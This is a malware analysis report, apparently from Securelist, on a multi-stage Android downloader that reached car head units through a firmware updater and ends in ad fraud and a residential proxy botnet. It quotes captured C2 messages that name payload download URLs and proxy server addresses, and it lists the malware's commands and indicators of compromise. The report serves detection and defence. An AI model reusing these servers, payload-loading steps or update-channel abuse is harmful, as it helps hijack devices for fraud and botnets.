---
source_url: https://securelist.com/android-head-unit-malware/121106/
fetched_at: 2026-08-24T12:40:34Z
fetch_method: jina
issue: 56
cover_image: https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2026/08/21071446/android-head-unit-malware-scaled.jpg
title_zh: 安卓车机恶意软件
tech_domain: frontend
---

# The invisible passenger in your car

While monitoring Android threats in June 2026, we discovered a new piece of Android malware. What struck us as unusual was that it installed like an ordinary user app yet made no attempt to disguise itself as legitimate software: it had no user interface at all. This led us to suspect the app might be reaching users’ devices without their knowledge. Further investigation confirmed that hypothesis and allowed us to reconstruct the entire infection chain.

Key findings:

*   We identified new Android malware: a multi-stage downloader whose ultimate purpose is ad fraud and creation of a proxy botnet.
*   The malware spread through the built-in updaters of Android-based automotive head unit firmware. This is the first documented case of malware found on a car head unit with an infection chain specific to that type of device.
*   We attribute this activity, with high confidence, to the MoYu Group, an actor linked to the BADBOX botnet.

Kaspersky solutions detect the threats described below under the following detection names:

*   HEUR:Trojan-Dropper.AndroidOS.Agent.vu
*   HEUR:Trojan-Downloader.AndroidOS.Agent.ov
*   HEUR:Trojan-Proxy.AndroidOS.Zhima.*
*   HEUR:Trojan.AndroidOS.Vo1d.*

## Head unit firmware overview

A head unit is a system that combines multimedia functions with partial control over certain vehicle functions. Head units may come as part of a car’s factory equipment or as an aftermarket upgrade. The main attack vectors for these systems are compromise via physical access and vulnerabilities in the head unit’s OS or components, [

![](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2020/12/01170247/xtraining-summer-sale-2026-banner_sl_800x800-740x740.png)

![](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2020/12/01171650/xtraining-summer-sale-2026-banner_sl_370x500.png)

![](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2026/07/06154127/supply-chain-threat-webinar-800x450.jpg)

![](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2026/07/06155529/mobile-threat-webinar-800x450.jpg)

![](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2026/07/20144234/SMB-cybersecurity-webinar_1024x576-800x450.jpg)

![](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2026/08/12204131/SOC-maturity-webinar-2026-800x450.png)

![](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2026/08/10093530/malware-report-q2-2026-featured-image-scaled-1-800x450.jpg)

![](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2026/08/10125346/trueconf-head-mare-ics-cert-featured-image-800x450.jpg)

![](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2026/06/17123426/Kaspersky-NEXT-2026_310x420.png)

![](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2026/07/21074741/cav3rn-outlook-dns-featured-image-800x450.jpg)

![](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2026/07/30070015/genielocker-featured-image-800x450.jpg)

![](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2026/07/30082905/octlurk_silklurk_backdoors-800x450.jpg)

![](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2026/08/03153602/cloud_phishing-scaled-1-800x450.jpg)

![](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2026/08/11062112/project-CAV3RN-continues_2-800x450.jpg)

![](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/09/23090648/necro-featured-image-800x450.jpg)

![](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/12/17082509/SL-Mamont-banker-featured-800x450.jpg)

![](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/02/05054858/SL-SparkCat-featured-800x450.jpg)

![](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2025/04/25081114/triada-report-featured-image-800x450.jpg)

![](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2026/02/17072352/SL-Keenadu-featured-800x450.jpg)

both of which we’ve covered previously](https://securelist.com/mercedes-benz-head-unit-security-research/115218/).

In some cases, head units run on Android, primarily because it’s convenient for manufacturers: Android’s source code already accounts for use cases within automotive head units. Android also allows manufacturers to add their own system applications during the build process, which they can use for a range of purposes: customizing the UI, adding system components tailored to the vendor’s needs, and more.

Most apps developed for Android devices can also run on an Android-based head unit, and that is true for malware as well. That said, it’s hard to imagine certain categories of smartphone-targeted malware being used to attack a head unit. Banking Trojans are a good example: since mobile banking is used almost exclusively on smartphones, infecting a head unit with a banking Trojan would be a waste of the attacker’s resources.

It’s worth noting that head units often include SIM card slots and can connect to the internet, enabling features like navigation and software updates. Since a head unit typically holds nothing of value to an attacker, one of the more likely attack scenarios using “classic” Android malware is infecting the device to recruit it into a botnet– similar to attacks on IoT devices.

During our research, we found exactly that kind of malware. The design of firmware for DoFun head units enabled attackers to distribute malware. We notified the vendor about the distribution scheme, and they subsequently reported fixing the security issues.

Below is the entire infection chain:

[![Image 1: Head unit infection scheme](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2026/08/20221354/head-unit-malware1.png)](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2026/08/20221354/head-unit-malware1.png)

Head unit infection scheme

Let’s look at exactly how these head units became infected.

## The TWCore app

TWCore is a legitimate system application responsible for collecting analytics data and updating the head unit software. Let’s take a closer look at how the update function works.

The process is fairly simple. An MQTT message broker hosted on the subdomain `cardoor[.]cn` sends a message containing information about the APK files that need to be downloaded and installed on the head unit. Notably, the object describing this message includes an `installNotExists` field, a Boolean flag that can be set to true or false. This flag allows TWCore to install apps that weren’t originally present on the device.

[![Image 2: TWCore only checks whether an app is already installed on the device when installNotExists = false](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2026/08/20221442/head-unit-malware2.png)](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2026/08/20221442/head-unit-malware2.png)

TWCore only checks whether an app is already installed on the device when installNotExists = false

The APK file is downloaded to `<TWCore external cache dir>/push/apk/` for installation.

[![Image 3: The path TWCore uses to download APK files](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2026/08/20221522/head-unit-malware3.png)](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2026/08/20221522/head-unit-malware3.png)

The path TWCore uses to download APK files

Our telemetry revealed previously unknown malware at these file paths. On top of that, our data indicates that in every observed case, the malware was installed by an app with the package name `com.tw.core`, which matches the TWCore package name.

Next, we’ll break down the malware installed by TWCore: the JarService dropper.

## Stage 1: the JarService dropper

As mentioned earlier, JarService is a small dropper app with no UI of any kind. It decrypts data stored as encrypted blocks within the Trojan’s code. Each block is XOR-encrypted with a single-byte key that shifts linearly from block to block. The decrypted data contains serialized information about the payload version and entry point, along with the malware’s own code for further loading.

[![Image 4: Decrypting and deserializing information about the stage 2 payload](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2026/08/20221611/head-unit-malware4.png)](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2026/08/20221611/head-unit-malware4.png)

Decrypting and deserializing information about the stage 2 payload

In the version of JarService we analyzed, the entry point for the next-stage payload was the `wa` method of the `com.c.j.qbh` class.

## Stage 2: the loader

This stage’s payload is a malicious loader. Its code contains encrypted strings that are later used as class names to execute the stage 3 payload using the reflection mechanism. The loader sends implant information to one of the attackers’ servers via a POST request. Example of a request to the C2 server:

1

2

3

4

5

6

7

8

9{

"userId":"REDACTED",

"dexVersion":"1.7",

"dexType":1,

"channelId":"2039",

"packageName":"com.tw.jar1",

"appVersion":12,

"appName":"JarService"

}

In response to the POST request, the C2 server returns a link for downloading the stage 3 payload. An example of a C2 response is shown below.

1

2

3

4

5

6

7

8{

"code":200,

"data":{

"dexUrl":"hxxp://144.217.243[.]201/vr34der34/dex3.68.png",

"dexVersion":3.680,

"status":0

}

}

The Trojan uses the link in the `dexUrl` field of the `data` object to download serialized data for loading the next stage. This data begins with a single-byte integer, a key used to decrypt the strings in the loader’s code. Immediately following this number is a four-byte floating-point value used to XOR-decrypt the stage 3 payload, which itself is located after these keys.

[![Image 5: Decrypting the stage 3 payload](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2026/08/20221652/head-unit-malware5.png)](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2026/08/20221652/head-unit-malware5.png)

Decrypting the stage 3 payload

In the decrypted payload, the entry point is the `init` method of the `com.ast.sdk.BillingMain` class, shown in the screenshot below.

[![Image 6: Entry point of the stage 3 payload](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2026/08/20221750/head-unit-malware6.png)](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2026/08/20221750/head-unit-malware6.png)

Entry point of the stage 3 payload

While analyzing this stage, we noticed that the download link for the next-stage payload includes a version number. We decided to try other version numbers to retrieve different payload versions, and ultimately obtained seven distinct variants, which we list under “Indicators of Compromise” at the end of this report. The earliest version, numbered 3.57, uses a different decoding algorithm than the one described above. This may indicate that an earlier version of the infection chain used a different loader between JarService and the stage 3 payload.

## Stage 3: clicker / reverse proxy loader

In this stage, the malware sends a POST request to `/cpc/api/task` every 90 minutes by default, containing information about the infected device (display resolution, device model, the SSID of the connected Wi-Fi network, MAC address, and so on) along with the Trojan’s configuration version. If the configuration is outdated, the C2 server returns an updated configuration containing new C2 addresses and new paths for sending HTTP requests. An example of a response is shown below. Note that at the time of our research, the most up-to-date configuration version was 3.82.

1

2

3

4

5

6

7

8

9

10

11

12

13{

"code":100,

"data":{

"configVersion":3.820,

"hosts":["hxxp://t2.kshahnd[.]sbs","hxxp://t2.mdsjhd[.]sbs","hxxp://t2.nmnsny[.]sbs","hxxps://t2.nmnsny[.]sbs"],

"interval":5500000,

"reportApi":"/cpc/api/report",

"tagName":"config",

"taskApi":"/cpc/api/task",

"updates":["hxxp://a2.kshahnd[.]sbs","hxxp://a2.mdsjhd[.]sbs","hxxp://a2.nmnsny[.]sbs","hxxps://a2.nmnsny[.]sbs"],

"vn":1.010

}

}

If the configuration version doesn’t need updating, the C2 server instead returns integer command identifiers, which the attackers refer to as `productId`. The Trojan maps each identifier to command information, which it stores as a serialized JSON object using the SharedPreferences API. Each identifier also has its own version, expressed as a UNIX timestamp. If the C2 response includes an unknown `productId` or one whose version is outdated, the malware sends a GET request to the attackers’ server at `/cpc/api/xml` to retrieve the command contents for all such identifiers. The C2 server responds with command information for each unknown identifier. An example of a response is shown below.

1

2

3

4

5

6

7

8

9

10

11

12

13

14

15

16

17{

"code":200,

"data":[{

"productId":979,

"script":"{\n\"loadType\": 1,\n\"reload\": true,\n\"method\": \"start\",\n\"url2\": \"hxxp://144.217.243[.]201/vr34der34/sh65.io\",\n\"md52\": \"de77c3303e93c9450424759f1741441c\",\n\"name\": \"zhima\",\n\"className\": \"com.miyc.transfer.Client\",\n\"thread\": true,\n\"tagName\": \"loadlib2\",\n\"params\": [\n{\n\"type\": \"Context\"\n},\n{\n\"type\": \"String\",\n\"value\": \"107.151.248[.]132\"\n},\n{\n\"type\": \"String\",\n\"value\": \"1002\"\n},\n{\n\"type\": \"int\",\n\"value\": 1337\n},\n{\n\"type\": \"int\",\n\"value\": 7777\n},\n{\n\"type\": \"int\",\n\"value\": 8888\n},\n{\n\"type\": \"int\",\n\"value\": 15000\n}\n],\n\"url\": \"hxxp://144.217.243[.]201/vr34der34/sh65.io\",\n\"md5\": \"de77c3303e93c9450424759f1741441c\"\n}",

"version":1778650942

},{

"productId":1019,

"script":"{\n\"loadType\": 1,\n\"reload\": true,\n\"method\": \"start\",\n\"url2\": \"hxxp://144.217.243[.]201/vr34der34/sh65.io\",\n\"md52\": \"de77c3303e93c9450424759f1741441c\",\n\"name\": \"zhima\",\n\"className\": \"com.miyc.transfer.Client\",\n\"thread\": true,\n\"tagName\": \"loadlib2\",\n\"params\": [\n{\n\"type\": \"Context\"\n},\n{\n\"type\": \"String\",\n\"value\": \"128.14.210[.]58\"\n},\n{\n\"type\": \"String\",\n\"value\": \"1002\"\n},\n{\n\"type\": \"int\",\n\"value\": 9999\n},\n{\n\"type\": \"int\",\n\"value\": 7777\n},\n{\n\"type\": \"int\",\n\"value\": 8888\n},\n{\n\"type\": \"int\",\n\"value\": 15000\n}\n],\n\"url\": \"hxxp://144.217.243[.]201/vr34der34/sh65.io\",\n\"md5\": \"de77c3303e93c9450424759f1741441c\"\n}",

"version":1766001509

},{

"productId":3505,

"script":"{\n\"tagName\":\"http\",\n\"url\":\"hxxps://api.kookjar[.]com/sayhi?channel=daihai&uuid={get_uuid_10}\"\n}",

"version":1776656317

}],

"msg":""

}

The command information includes a `tagName` field, which is the command name. The code maps each name to the corresponding class responsible for executing it.

[![Image 7: List of executable commands](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2026/08/20221919/head-unit-malware7.png)](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2026/08/20221919/head-unit-malware7.png)

List of executable commands

At the time of our research, the attackers had implemented nine commands. The table below lists command names, brief descriptions, and arguments. The functionality of these commands suggests that the malware can be used to display ads, commit ad fraud (serving as a clicker), and download additional malicious code.

**Command name****Description****Arguments**
`return`Return a value from SharedPreferences.`key`: the key whose value should be returned
`copy`Set the contents of the clipboard.`text`: the key whose value from SharedPreferences is returned as the clipboard contents

`url`: a link for downloading gzip-compressed data (optional); this data is then concatenated with the value of the text key, with `` (5 spaces) used as a separator
`http`Make a POST/GET HTTP request to a specified resource and, if instructed, save the response in SharedPreferences under a specified key.`url`: the resource address

`method`: the HTTP method name (optional)

`startLabel`: a marker for the start of the data to save from the resource (optional)

`endLabel`: a marker for the end of the data to save from the resource (optional)

`valueLabel`: the key under which to save the value (optional)

`header`: a dictionary of headers for the HTTP request (optional)

`content`: the content of the POST request (optional)
`web`Open a link in the WebView and execute arbitrary JavaScript code within it.`url`: the link to open in the WebView

`js`: base64-encoded JavaScript code to execute in the WebView; used when the url parameter is empty or absent

`corejs`: JavaScript code to execute when the resource loads in the WebView (optional)

`param`: a string dictionary of parameters for launching the WebView

`client`: if this key is present, WebViewClient is used to handle redirects manually

`time`: task timeout
`loadlib`Not fully implemented at the time of publishing this report.–
`loadlib2`Download and execute arbitrary code.`url`: the address to download the payload from

`name`: the name of the module being downloaded

`md5`: the MD5 hash of the payload

`clear`: a comma-separated list of payload names to delete (optional)

`params`: an array of parameters to launch the payload with

`className`: the class name of the payload entry point

`method`: the name of the virtual method at the payload entry point

`cmethod`: the name of the static method used to instantiate the entry-point class (optional)

`thread`: a flag; the payload runs in a separate thread if this flag is not set

`reload`: a flag that, when set, restarts already loaded modules
`loadlib3`Not fully implemented at the time of publishing this report.–
`deeplink`Open a resource in the browser.`url`: a link to the resource
`traceroute`Check resource availability via an ICMP ping.`host`: comma-separated list of resources to check

However, attackers use only a relatively small subset of these commands in real-world attacks. As shown in the example C2 response above, at the time of publishing this report the attackers were using the `loadlib2` and `http` commands. The payload downloaded via the `loadlib2` command is a reverse proxy module named “zhima”, which researchers from the Nokia Deepfield Emergency Response Team independently discovered in TV set-top boxes around the same time as we did and also [described](https://github.com/deepfield/public-research/blob/main/ipmoyu/report.md) in their report. This confirms that the attackers’ ultimate goal is building a proxy botnet.

While investigating this stage of the attack chain, we noticed that the zhima download link also included a version number. As with the previous stage, we tried other possible version numbers and found eight variants of the zhima module, the earliest of which was version 57. The complete list of identified zhima modules is provided under “Indicators of Compromise” below.

## Attribution

While analyzing the complete infection chain, we noticed that the stage 2 loader created a thread with the meaningful name `mosdk-host-loader`. We decided to investigate what `mosdk` referred to in that name. This led us to a malicious app installed on various TV set-top boxes with the package name `com.abc.nexus` (3AD4BF5A86D26FFBF09CAE42AF330A98). It consists of several components (including a dropper similar to JarService), each used by the attackers to covertly monetize the device’s computing power. Each malicious component in the app corresponds to its own service, and the service containing the launch code for the JarService-like dropper is named `AdmoyuService`. In light of this and the name of the malicious thread found in the payload code, we concluded that `moyu` in the service name referred to MoYu Group, one of the actors linked to the BADBOX malware platform, which had been [described](https://www.humansecurity.com/learn/blog/satori-threat-intelligence-disruption-badbox-2-0/) by researchers at HUMAN. This assessment is further supported by extensive overlap between the malware’s network infrastructure and that of MoYu Group, which was independently identified by researchers from the Nokia Deepfield Emergency Response Team around the same time as our own research. Based on these similar naming patterns and prominent infrastructure overlap between the activity of MoYu Group and the attacks described in this report, we attribute it to the same actor with high confidence.

While investigating the malware downloaded by TWCore, we noticed that the domain `admin.uipoxy[.]com` resolved to the IP address `128.14.210[.]58`, one of the C2 servers for the zhima reverse proxy module. It appears that the URL `hxxp://admin.uipoxy[.]com/proxy/u/login` hosts the zhima admin panel. Interestingly, this panel allows anyone to register as long as they have a valid invite code.

[![Image 8: The malware operator registration page](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2026/08/20222009/head-unit-malware8.png)](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2026/08/20222009/head-unit-malware8.png)

The malware operator registration page

During registration, users are prompted to review the terms of use and privacy policy. Both documents are hosted on links under the `pxyedge[.]com` domain, which belongs to PXYEDGE, a vendor specializing in the sale of residential proxies.

On the registration page hosted at `admin.uipoxy[.]com`, we also found the string copyright©2020 proxyforu[.]com all rights reserved, which linked to `hxxps://proxyforu[.]com`, the website of ProxyForU, another vendor of residential proxy services.

We found several similarities in the authentication APIs across all of these sites:

*   The sign-in page was hosted on an `admin.*` subdomain.
*   The sign-in page was located at `/proxy/u/login`.
*   The signup page was located at `/proxy/register?channelKey=<invitation code>`.

Based on this, we believe these services are connected to MoYu Group.

## Conclusion

Despite efforts by cybersecurity professionals and law enforcement to shut down the BADBOX botnet, individual actors linked to it continue their malicious activity, infecting devices worldwide. Delivery methods for this kind of malware vary widely, from downloads via pre-installed backdoors to infected builds of IPTV apps. The case examined here demonstrates an even more sophisticated delivery method: distribution through the legitimate update functionality of a system application. Attackers are also actively expanding into new platforms. This malware is the first known malicious app targeting head units, which means these platforms now require protection against malware as well.

## Indicators of compromise

### Stage 1: JarService

[ba27951b4ee1c341f4415d033369ecd3](https://opentip.kaspersky.com/ba27951b4ee1c341f4415d033369ecd3/results?icid=gl_sl_post-opentip_sm-team_eb0e1a91076730a8&utm_source=SL&utm_medium=SL&utm_campaign=SL)

[d63bacd6d6709dd68a10ef9d374c7835](https://opentip.kaspersky.com/d63bacd6d6709dd68a10ef9d374c7835/results?icid=gl_sl_post-opentip_sm-team_aebc22e63cc04652&utm_source=SL&utm_medium=SL&utm_campaign=SL)

[6c2e34b30da42085240ede53ab6107d4](https://opentip.kaspersky.com/6c2e34b30da42085240ede53ab6107d4/results?icid=gl_sl_post-opentip_sm-team_ad3b204e6b047a3a&utm_source=SL&utm_medium=SL&utm_campaign=SL)

[8b5e513144a6138a966ea59e68bf9da2](https://opentip.kaspersky.com/8b5e513144a6138a966ea59e68bf9da2/results?icid=gl_sl_post-opentip_sm-team_2071c71eee4d4f48&utm_source=SL&utm_medium=SL&utm_campaign=SL)

[e119845877089d6f4b0a70dc7388f316](https://opentip.kaspersky.com/e119845877089d6f4b0a70dc7388f316/results?icid=gl_sl_post-opentip_sm-team_f011c7e096211908&utm_source=SL&utm_medium=SL&utm_campaign=SL)

### Stage 2: loader

[e9f3a0dab6949ce2cddab9e0aa80ae1a](https://opentip.kaspersky.com/e9f3a0dab6949ce2cddab9e0aa80ae1a/results?icid=gl_sl_post-opentip_sm-team_3086c1d2b8c6dadb&utm_source=SL&utm_medium=SL&utm_campaign=SL)

### Stage 3: loader/clicker

[0fbaa7092204f4b1494e0b840b014774](https://opentip.kaspersky.com/0fbaa7092204f4b1494e0b840b014774/results?icid=gl_sl_post-opentip_sm-team_8ca673e23ef1d7d4&utm_source=SL&utm_medium=SL&utm_campaign=SL)

[1dcf031c40ce456b6a36a00b0acf3d11](https://opentip.kaspersky.com/1dcf031c40ce456b6a36a00b0acf3d11/results?icid=gl_sl_post-opentip_sm-team_432a1b975c97c0be&utm_source=SL&utm_medium=SL&utm_campaign=SL)

[44b6b213a6a3f299eaf88e078de95ecb](https://opentip.kaspersky.com/44b6b213a6a3f299eaf88e078de95ecb/results?icid=gl_sl_post-opentip_sm-team_a135a5e9b7ff4869&utm_source=SL&utm_medium=SL&utm_campaign=SL)

[67dc78e544ebce16b85dc7c195dfbc58](https://opentip.kaspersky.com/67dc78e544ebce16b85dc7c195dfbc58/results?icid=gl_sl_post-opentip_sm-team_73efed65bfd8afcd&utm_source=SL&utm_medium=SL&utm_campaign=SL)

[9642ae619b3165d23c6349002d1abe24](https://opentip.kaspersky.com/9642ae619b3165d23c6349002d1abe24/results?icid=gl_sl_post-opentip_sm-team_214a5b59ad0290cc&utm_source=SL&utm_medium=SL&utm_campaign=SL)

[b067d5b0dbecbd6498bcdfba45dba77e](https://opentip.kaspersky.com/b067d5b0dbecbd6498bcdfba45dba77e/results?icid=gl_sl_post-opentip_sm-team_20a2ebc1b8c6fec6&utm_source=SL&utm_medium=SL&utm_campaign=SL)

[f0e3f7eba2cde91e2dedb921bab47422](https://opentip.kaspersky.com/f0e3f7eba2cde91e2dedb921bab47422/results?icid=gl_sl_post-opentip_sm-team_8512533cba8e1f41&utm_source=SL&utm_medium=SL&utm_campaign=SL)

### zhima module

[412e9243f2981bbea3894254d105b3b8](https://opentip.kaspersky.com/412e9243f2981bbea3894254d105b3b8/results?icid=gl_sl_post-opentip_sm-team_6b7e557ea65ed8a1&utm_source=SL&utm_medium=SL&utm_campaign=SL)

[71ab5517f71866279d0d87d37f2ae320](https://opentip.kaspersky.com/71ab5517f71866279d0d87d37f2ae320/results?icid=gl_sl_post-opentip_sm-team_b4aeb6e9daf65d95&utm_source=SL&utm_medium=SL&utm_campaign=SL)

[89ef78f716a75964539f2db6520be362](https://opentip.kaspersky.com/89ef78f716a75964539f2db6520be362/results?icid=gl_sl_post-opentip_sm-team_2aab7272fe595787&utm_source=SL&utm_medium=SL&utm_campaign=SL)

[a4223ce4288a230d1e6c3ff2c7639045](https://opentip.kaspersky.com/a4223ce4288a230d1e6c3ff2c7639045/results?icid=gl_sl_post-opentip_sm-team_e46d364c00b24c45&utm_source=SL&utm_medium=SL&utm_campaign=SL)

[bd4d81cd27125ad3d9a114922d468499](https://opentip.kaspersky.com/bd4d81cd27125ad3d9a114922d468499/results?icid=gl_sl_post-opentip_sm-team_9ae7b61335fd348e&utm_source=SL&utm_medium=SL&utm_campaign=SL)

[c6bfb1643ac7474ed8a7b4f96a187fdb](https://opentip.kaspersky.com/c6bfb1643ac7474ed8a7b4f96a187fdb/results?icid=gl_sl_post-opentip_sm-team_0fdb9ba00a5efe0a&utm_source=SL&utm_medium=SL&utm_campaign=SL)

[de77c3303e93c9450424759f1741441c](https://opentip.kaspersky.com/de77c3303e93c9450424759f1741441c/results?icid=gl_sl_post-opentip_sm-team_a9a1239339fbf2eb&utm_source=SL&utm_medium=SL&utm_campaign=SL)

[f8cf8c23ff597700d471fb7767df8bac](https://opentip.kaspersky.com/f8cf8c23ff597700d471fb7767df8bac/results?icid=gl_sl_post-opentip_sm-team_e996fad8820e5d83&utm_source=SL&utm_medium=SL&utm_campaign=SL)

### Domains and IP addresses

[xmsae[.]sbs](https://opentip.kaspersky.com/xmsae.sbs/?icid=gl_sl_post-opentip_sm-team_af53b7390ad56d10&utm_source=SL&utm_medium=SL&utm_campaign=SL)

[ishano456[.]sbs](https://opentip.kaspersky.com/ishano456.sbs/?icid=gl_sl_post-opentip_sm-team_15ca4c0b8a49e1ab&utm_source=SL&utm_medium=SL&utm_campaign=SL)

[xshaon123[.]sbs](https://opentip.kaspersky.com/xshaon123.sbs/?icid=gl_sl_post-opentip_sm-team_f2d45150d16a123e&utm_source=SL&utm_medium=SL&utm_campaign=SL)

[kshahnd[.]sbs](https://opentip.kaspersky.com/kshahnd.sbs/?icid=gl_sl_post-opentip_sm-team_6c4c102147179116&utm_source=SL&utm_medium=SL&utm_campaign=SL)

[mdsjhd[.]sbs](https://opentip.kaspersky.com/mdsjhd.sbs/?icid=gl_sl_post-opentip_sm-team_7045e8a7bd52b4be&utm_source=SL&utm_medium=SL&utm_campaign=SL)

[nmnsny[.]sbs](https://opentip.kaspersky.com/nmnsny.sbs/?icid=gl_sl_post-opentip_sm-team_f337a7f06fa5c42c&utm_source=SL&utm_medium=SL&utm_campaign=SL)

[kookjar[.]com](https://opentip.kaspersky.com/kookjar.com/?icid=gl_sl_post-opentip_sm-team_8417d16bd4cdf399&utm_source=SL&utm_medium=SL&utm_campaign=SL)

[ty54fgd435[.]my](https://opentip.kaspersky.com/ty54fgd435.my/?icid=gl_sl_post-opentip_sm-team_fed8e37796b7f171&utm_source=SL&utm_medium=SL&utm_campaign=SL)

[ue886578433[.]online](https://opentip.kaspersky.com/ue886578433.online/?icid=gl_sl_post-opentip_sm-team_8f073e94983be24f&utm_source=SL&utm_medium=SL&utm_campaign=SL)

[ty4523[.]space](https://opentip.kaspersky.com/ty4523.space/?icid=gl_sl_post-opentip_sm-team_eedda46b6715dbf4&utm_source=SL&utm_medium=SL&utm_campaign=SL)

[144.217.243[.]201](https://opentip.kaspersky.com/144.217.243.201/?icid=gl_sl_post-opentip_sm-team_36fb15ab2c595ccb&utm_source=SL&utm_medium=SL&utm_campaign=SL)

[107.151.248[.]132](https://opentip.kaspersky.com/107.151.248.132/?icid=gl_sl_post-opentip_sm-team_7f6c2171856a87c9&utm_source=SL&utm_medium=SL&utm_campaign=SL)

[128.14.210[.]58](https://opentip.kaspersky.com/128.14.210.58/?icid=gl_sl_post-opentip_sm-team_27eb5c2f48463693&utm_source=SL&utm_medium=SL&utm_campaign=SL)

### Addresses used to download JarService

[hxxp://ovcloudcontrol.cdn.cardoor[.]cn/upgrade/2026-06-08/bd80bd3c3d0e4bf6b5b4a825650d01f5.apk](https://opentip.kaspersky.com/hxxp%3a%2f%2fovcloudcontrol.cdn.cardoor.cn%2fupgrade%2f2026-06-08%2fbd80bd3c3d0e4bf6b5b4a825650d01f5.apk/?icid=gl_sl_post-opentip_sm-team_6fa27f6e45e16a27&utm_source=SL&utm_medium=SL&utm_campaign=SL)

[hxxp://ovcloudcontrol.cdn.cardoor[.]cn/upgrade/2025-06-10/fe71af9ecf174de48d2b2ccc2c15fb04.apk](https://opentip.kaspersky.com/hxxp%3a%2f%2fovcloudcontrol.cdn.cardoor.cn%2fupgrade%2f2025-06-10%2ffe71af9ecf174de48d2b2ccc2c15fb04.apk/?icid=gl_sl_post-opentip_sm-team_355b852b88a5dcdb&utm_source=SL&utm_medium=SL&utm_campaign=SL)

[hxxp://ovcloudcontrol.cdn.cardoor[.]cn/upgrade/2024-11-07/fa831c3c23824b99871163387bcda7ad.apk](https://opentip.kaspersky.com/hxxp%3a%2f%2fovcloudcontrol.cdn.cardoor.cn%2fupgrade%2f2024-11-07%2ffa831c3c23824b99871163387bcda7ad.apk/?icid=gl_sl_post-opentip_sm-team_e15c21f403bffa54&utm_source=SL&utm_medium=SL&utm_campaign=SL)

### Hashes of TWCore (the legitimate software used to distribute JarService)

2a64c3efc11bf224aa54f24e876446c9

 7a4d3ba2dacccfdda55859a5dfee2671

 ea24487996eb70c1780922fb3063bcc5

<!-- media:svg src="https://securelist.com/wp-content/themes/securelist2020/assets/images/icon/icon-categories.svg" -->

<!-- media:svg src="https://securelist.com/wp-content/themes/securelist2020/assets/images/icon/icon-categories--invert.svg" -->

![](https://securelist.com/wp-content/themes/securelist2020/assets/images/icon/icon-categories.svg)

![](https://securelist.com/wp-content/themes/securelist2020/assets/images/icon/icon-categories--invert.svg)

![](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2026/08/21071446/android-head-unit-malware-1200x600.jpg)

![](https://securelist.com/wp-content/themes/securelist2020/assets/images/avatar-default/avatar_default_3.png)
